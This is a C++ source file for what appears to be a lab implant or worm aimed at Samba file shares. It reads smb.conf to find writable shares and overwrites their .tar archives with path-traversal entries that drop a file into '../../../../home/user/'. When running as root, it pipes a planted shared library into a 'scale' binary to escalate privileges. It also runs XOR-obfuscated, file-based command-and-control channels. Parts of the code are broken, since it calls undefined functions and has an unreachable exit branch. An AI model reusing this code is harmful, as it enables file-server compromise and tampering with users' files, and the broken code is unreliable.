#include <filesystem>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <stdexcept>
#include <system_error>
#include <queue>
#include <unordered_map>
#include <vector>
#include <random>
#include <cstring>
#include <mutex>
#include <functional>
#include <algorithm>
#include <chrono>
#include <cstring>
#include <archive.h>
#include <archive_entry.h>
#include <fcntl.h>
#include <map>
#include <cstdlib>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>


namespace fs = std::filesystem;
int routerID = -1;
fs::path sambaRouterPath;
std::vector<char> xorKey = {0x67};

std::vector<char> xorEncodeFile(const std::vector<char>& data, const std::vector<char>& key) {
    std::vector<char> out(data.size());
    for (size_t i = 0; i < data.size(); i++)
        out[i] = data[i] ^ key[i % key.size()];
    return out;
}

std::vector<char> xorDecodeFile(const std::vector<char>& data, const std::vector<char>& key) {
    return xorEncodeFile(data, key);
}

static std::string xorDecode(const std::string& encoded) {
    auto raw = base64UrlDecode(encoded);
    std::string result;
    result.reserve(raw.size());
    for (auto b : raw) result += static_cast<char>(b ^ XOR_KEY);
    return result;
}

static std::map<std::string, std::string>
decodeDict(const std::map<std::string, std::string>& d) {
    std::map<std::string, std::string> result;
    for (const auto& [k, v] : d) result[xorDecode(k)] = xorDecode(v);
    return result;
}

class Job {
    public:
        int jobID;
        int srcID;
        int destID;
        char flag;
        char gateway;
        std::string type;
        std::vector<std::byte> data;

        void decode(fs::path target) {
            std::ifstream ifs(target, std::ios::binary);
            std::vector<char> byteData((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());            
            int size = byteData.size();
            byteData = xorDecodeFile(byteData, xorKey);
            std::memcpy(&jobID, &byteData[0], sizeof(int));
            std::memcpy(&srcID, &byteData[4], sizeof(int));
            std::memcpy(&destID, &byteData[8], sizeof(int));
            std::memcpy(&flag, &byteData[12], sizeof(char));
            std::memcpy(&gateway, &byteData[13], sizeof(char));
            type = std::string(&byteData[14], 10);
            data.resize(size - 24);
            std::memcpy(&data[0], &byteData[24], size - 24);
        }

        void encode(fs::path target) {
            std::vector<char> byteData(24 + data.size());
            std::memcpy(&byteData[0], &jobID, sizeof(int));
            std::memcpy(&byteData[4], &srcID, sizeof(int));
            std::memcpy(&byteData[8], &destID, sizeof(int));
            std::memcpy(&byteData[12], &flag, sizeof(char));
            std::memcpy(&byteData[13], &gateway, sizeof(char));
            std::memcpy(&byteData[14], type.data(), 10);
            std::memcpy(&byteData[24], data.data(), data.size());
            byteData = xorEncodeFile(byteData, xorKey);
            std::ofstream ofs(target, std::ios::binary | std::ios::trunc);
            ofs.write(byteData.data(), byteData.size());
        }
};

class Channel {
public:
    enum Mode {INBOUND, OUTBOUND, ALIVE};
    Mode mode;
    fs::path filepath;
    std::mutex mtx;

    Channel() : mode(OUTBOUND) {}

    Channel(Mode mode, fs::path filepath)
        : mode(mode), filepath(filepath) 
    {
        std::ifstream target(filepath);
        //!std::filesystem::exists("/srv/samba/vulnshare/GOTYOU.txt")
        if (!fs::exists(filepath)) {
            std::ofstream out(filepath);
            out.close();
            std::cout << "Channel created:" << std::endl;
            std::cout << filepath.string() << std::endl;
        }
        else {
            std::cout << "Channel " + filepath.string() + " already exists!" << std::endl;
        }
    }

    bool write(Job& job) {
        std::lock_guard<std::mutex> lock(mtx);
        if (mode == INBOUND && fs::exists(filepath) && fs::file_size(filepath) > 0) {
            return false;
        }
        job.encode(filepath);
        return true;
    }

    bool read(Job& out) {
        std::lock_guard<std::mutex> lock(mtx);
        if (!fs::exists(filepath) || fs::file_size(filepath) == 0) {
            return false;
        }
        out.decode(filepath);
        clear_unlocked();
        return true;
    }

    bool peek(Job& out) {
        std::lock_guard<std::mutex> lock(mtx);
        if (!fs::exists(filepath) || fs::file_size(filepath) == 0) {
            return false;
        }
        out.decode(filepath);
        return true;
    }

    bool empty() {
        std::lock_guard<std::mutex> lock(mtx);
        return !fs::exists(filepath) || fs::file_size(filepath) == 0;
    }

    void clear() {
        std::lock_guard<std::mutex> lock(mtx);
        clear_unlocked();
    }

private:
    void clear_unlocked() {
        if (fs::exists(filepath)) {
            std::ofstream(filepath, std::ios::binary | std::ios::trunc);
        }
    }
};

class Client {
public:
    enum Role {X_NODE, Y_NODE};
    int nodeID;
    Role role;
    Channel inbound;
    Channel outbound;
    Channel alive; 

    bool pendingAck;
    int pendingJobID;
    std::chrono::steady_clock::time_point ackDeadline;
    std::chrono::steady_clock::time_point lastAlive;
    int missedAliveCount;

    Client() : nodeID(-1), role(Y_NODE), pendingAck(false),
               pendingJobID(-1), missedAliveCount(0) {}

    Client(int id, Role role, fs::path basePath)
        : nodeID(id), role(role), pendingAck(false),
          pendingJobID(-1), missedAliveCount(0), inbound(Channel::INBOUND, basePath / "command.txt"),
          outbound(Channel::OUTBOUND, basePath / "data.txt"),
          alive(Channel::ALIVE, basePath / "status.txt")
    {
        //fs::create_directories(basePath);
        //inbound = Channel(Channel::INBOUND, basePath / "command.txt");
        //outbound = Channel(Channel::OUTBOUND, basePath / "data.txt");
        //alive = Channel(Channel::ALIVE, basePath / "status.txt");
        lastAlive = std::chrono::steady_clock::now();
    }

    bool isResponsive() const {
        return missedAliveCount < 3;
    }

    void markAlive() {
        lastAlive = std::chrono::steady_clock::now();
        missedAliveCount = 0;
    }

    void tickMissedAlive() {
        missedAliveCount++;
    }
};

class Scheduler {
public:
    std::unordered_map<int, Client> clients;
    std::queue<int> gateways;
    Channel controllerChannel;        

    std::chrono::milliseconds ackTimeout = std::chrono::milliseconds(5000);
    std::chrono::milliseconds cycleInterval = std::chrono::milliseconds(100);
    int maxPendingAcks = 8;

    std::vector<Job> inboundQueue;
    std::mutex queueMtx;

    std::function<void(Job&)> onAckForward;
    std::function<void(Job&)> onAliveForward;     
    std::function<void(int, Job&)> onDeadLetter;       
    std::function<void(int)> onNodeUnresponsive; 

    void registerClient(int nodeID, Client::Role role, fs::path basePath) {
        clients.emplace(std::piecewise_construct, std::forward_as_tuple(nodeID), std::forward_as_tuple(nodeID, role, basePath));
        if (role == Client::Role::X_NODE) {
            gateways.push(nodeID);
        }
        std::cout << "Client created!" << std::endl;
    }

    void createDefault(Client::Role role, fs::path searchPath) {
        registerClient(67, role, searchPath);
        std::cout << "Default client created!" << std::endl;
    }

    //void setControllerPath(fs::path path) {
    //    controllerChannel = Channel(Channel::OUTBOUND, std::move(path));
    //}

    void enqueueInbound(Job job) {
        std::lock_guard<std::mutex> lock(queueMtx);
        inboundQueue.push_back(job);
    }

    void tick() {
        sweepAlive();
        sweepOutbound();
        checkPendingAcks();
        dispatchInbound();
    }

private:
    void sweepAlive() {
        for (auto& [id, client] : clients) {
            Job aliveMsg;
            if (client.alive.read(aliveMsg)) {
                client.markAlive();
                if (client.role == Client::Role::Y_NODE && aliveMsg.gateway == 'y') {
                    gateways.push(id);
                    client.role = Client::Role::X_NODE;
                }
                if (onAliveForward) {onAliveForward(aliveMsg);}
            } 
            else {
                client.tickMissedAlive();
                if (!client.isResponsive() && onNodeUnresponsive) {
                    onNodeUnresponsive(id);
                    if (client.role == Client::Role::X_NODE) {
                        std::queue<int> temp;
                        bool found = false;
                        while (!gateways.empty()) {
                            if (gateways.front() == id && !found) {
                                found = true;
                                client.role = Client::Role::Y_NODE;
                            } 
                            else {
                                temp.push(gateways.front());
                            }
                            gateways.pop();
                        }
                        gateways = temp;
                    }
                }
            }
        }
    }

    void sweepOutbound() {
        for (auto& [id, client] : clients) {
            Job outMsg;
            if (client.outbound.read(outMsg)) {
                if (client.pendingAck && outMsg.jobID == client.pendingJobID) {
                    client.pendingAck = false;
                    client.inbound.clear();
                    if (onAckForward) {onAckForward(outMsg);}
                } 
                else {
                    routeMessage(outMsg);
                }
            }
        }
    }

    void checkPendingAcks() {
        auto now = std::chrono::steady_clock::now();
        for (auto& [id, client] : clients) {
            if (!client.pendingAck) {continue;}
            if (now >= client.ackDeadline) {
                Job staleMsg;
                if (client.inbound.read(staleMsg)) {
                    if (onDeadLetter) {onDeadLetter(id, staleMsg);}
                }
                client.pendingAck = false;
                client.inbound.clear();
            }
        }
    }

    void dispatchInbound() {
        std::lock_guard<std::mutex> lock(queueMtx);
        if (inboundQueue.empty()) {return;}
        int currentPending = 0;
        for (auto& [id, client] : clients)
            if (client.pendingAck) {currentPending++;}
        std::vector<int> ready;
        for (auto& [id, client] : clients) {
            if (!client.pendingAck && client.isResponsive()) {
                ready.push_back(id);
            }
        }
        std::sort(ready.begin(), ready.end(), [&](int a, int b) {
            return clients[a].lastAlive > clients[b].lastAlive;
        });
        auto it = inboundQueue.begin();
        while (it != inboundQueue.end() && currentPending < maxPendingAcks) {
            int dest = it->destID;
            auto found = std::find(ready.begin(), ready.end(), dest);
            if (found == ready.end()) {++it; continue;}
            auto& client = clients[dest];
            if (client.inbound.write(*it)) {
                client.pendingAck = true;
                client.pendingJobID = it->jobID;
                client.ackDeadline = std::chrono::steady_clock::now() + ackTimeout;
                ready.erase(found);
                it = inboundQueue.erase(it);
                currentPending++;
            } 
            else {
                ++it;
            }
        }
    }

    void routeMessage(Job& msg) {
        int attempts = gateways.size();
        if (msg.destID != 0) {
            auto dest = clients.find(msg.destID);
            if (dest != clients.end()) {
                enqueueInbound(msg);
                return;
            }
        }
        else if (msg.destID == -1) {
            exit(0);
        }
        while (attempts-- > 0) {
            int candidate = gateways.front();
            gateways.pop();
            gateways.push(candidate);
            auto dest = clients.find(candidate);
            if (dest != clients.end() && dest->second.isResponsive()) {
                msg.destID = candidate;
                enqueueInbound(msg);
                return;
            }
        }
        if (onDeadLetter) {onDeadLetter(msg.srcID, msg);}
    }
};

struct Share {
    std::string name;
    std::string path;
    std::vector<fs::path> fileMatches;
};

class Handler {
public:
    explicit Handler(const std::string& confPath) {
        parseConf(confPath);
    }

    void scan(const std::string& ext) {
        std::cout << "Searching for tar!" << std::endl;
        std::string norm = extNormalize(ext);
        for (auto& [name, share] : shares_) {
            std::cout << "Checking shares!" << std::endl;
            share.fileMatches.clear();
            if (share.path.empty() || !fs::is_directory(share.path))
                continue;
            for (auto& entry : fs::recursive_directory_iterator(share.path, fs::directory_options::skip_permission_denied)) {
                if (entry.is_regular_file() && entry.path().extension() == norm)
                    share.fileMatches.push_back(entry.path());
            }
        }
    }

    const std::map<std::string, Share>& shares() const {return shares_;}

private:
    std::map<std::string, Share> shares_;

    static std::string trim(const std::string& s) {
        auto a = s.find_first_not_of(" \t\r\n");
        if (a == std::string::npos) {return {};}
        auto b = s.find_last_not_of(" \t\r\n");
        return s.substr(a, b - a + 1);
    }

    static std::string toLower(std::string s) {
        for (char& c : s) c = static_cast<char>(std::tolower(c));
        return s;
    }

   
    static std::string stripComm(const std::string& s) {
        bool inQ = false;
        for (std::size_t i = 0; i < s.size(); ++i) {
            if (s[i] == '"') {inQ = !inQ; continue;}
            if (!inQ && (s[i] == '#' || s[i] == ';')) {
                return s.substr(0, i);
            }
        }
        return s;
    }

    static bool isYes(const std::string& v) {
        std::string l = toLower(trim(v));
        return (l == "yes" || l == "true" || l == "1");
    }
    static bool isNo(const std::string& v) {
        std::string l = toLower(trim(v));
        return (l == "no" || l == "false" || l == "0");
    }

    void parseConf(const std::string& confPath) {
        std::ifstream f(confPath);
        std::string currSection;
        bool currWritable  = false;
        std::string currPath;
        auto commit = [&]() {
            if (currSection.empty() || currSection == "global" || currSection == "printers" || currSection == "homes") {return;}
            if (currWritable && !currPath.empty()){
                shares_[currSection] = {currSection, currPath, {}};
            }
        };
        std::string line;
        while (std::getline(f, line)) {
            line = trim(stripComm(line));
            if (line.empty()) {continue;}
            if (line.front() == '[') {
                commit();              
                auto close = line.find(']');
                if (close == std::string::npos) {continue;}
                currSection = trim(line.substr(1, close - 1));
                currWritable = false;
                currPath.clear();
                continue;
            }
            auto eq = line.find('=');
            if (eq == std::string::npos) {continue;}
            std::string key = toLower(trim(line.substr(0, eq)));
            std::string val = trim(line.substr(eq + 1));
            if (key == "path") {
                currPath = val;
            } 
            else if (key == "writable" || key == "writeable") {
                currWritable = isYes(val);
            } 
            else if (key == "read only") {
                currWritable = isNo(val);
            }
        }
        commit();
    }

    static std::string extNormalize(const std::string& ext) {
        if (!ext.empty() && ext.front() != '.') {return '.' + ext;}
        return ext;
    }
};

class Driver {
    public:
        Handler fileHandler;
        Scheduler router;
        fs::path defaultPath;
        fs::path firstUpdate;
        fs::path secondUpdate;
        fs::path replace;
        Driver(const std::string confPath, fs::path firstPath, fs::path secondPath, fs::path def, fs::path repl)
            : fileHandler(confPath), router()
        {
           firstUpdate = firstPath;
           secondUpdate = secondPath;
           defaultPath = def;
           replace = repl;
        }

        void startup() {
            if (geteuid() == 0) {
                pid_t pid = fork();
                if (pid == 0) {
                    system("echo '/srv/samba/vulnshare/sambatest.so' | /srv/samba/vulnshare/scale");
                    std::cout << "Escalating!" << std::endl;
                    exit(0);
                }
                else {                    
                    waitpid(pid, NULL, 0);
                }
            }
            else {
                runLoop();
            }
        }

        void runLoop(){
            updateShares();
            while (true) {
                router.tick();
            }
        }

    private:
    void updateShares(){
        fileHandler.scan(".tar");
        std::cout << "Preparing to add clients!" << std::endl;
        for (auto& [name, share] : fileHandler.shares()) {
            if (share.path == "/srv/samba/vulnshare") {
                router.createDefault(Client::Role::X_NODE, share.path);

            }
            else {
                router.registerClient(1, Client::Role::Y_NODE, share.path);
            }
            std::cout << share.path << std::endl;
            for (auto& path : share.fileMatches){
                buildTar(path, firstUpdate, "../../../../home/user/", replace);
                buildTar(path, secondUpdate, "../../../../home/user/", replace);
                std::cout << "Tars built!" << std::endl;
            }
        }
    }

    void buildTar(fs::path archivePath, fs::path addedFile, fs::path prefix, fs::path replace) {
        struct archive* a;
        struct archive_entry* entry;
        struct stat st;
        char buffer[8192];
        int len;
        int fd;
        a = archive_write_new();
        archive_write_set_format_pax_restricted(a);
        archive_write_open_filename(a, archivePath.c_str());
        stat(addedFile.c_str(), &st);
        entry = archive_entry_new();
        archive_entry_set_pathname(entry, (prefix / replace.filename()).string().c_str());
        archive_entry_copy_stat(entry, &st);
        archive_write_header(a, entry);
        fd = open(addedFile.c_str(), O_RDONLY);
        while ((len = read(fd, buffer, sizeof(buffer))) > 0) {
            archive_write_data(a, buffer, len);
        }
        close(fd);
        archive_entry_free(entry);
        archive_write_close(a);
        archive_write_free(a);
    }
};

int main(){
    Driver drive("/usr/local/samba/etc/smb.conf", "/srv/samba/vulnshare/crashrc.txt", "/srv/samba/vulnshare/crashrc.txt", "/srv/samba/vulnshare/smb.ini", "HAHAHAHAHAHAHAHAHA");
    drive.startup();
}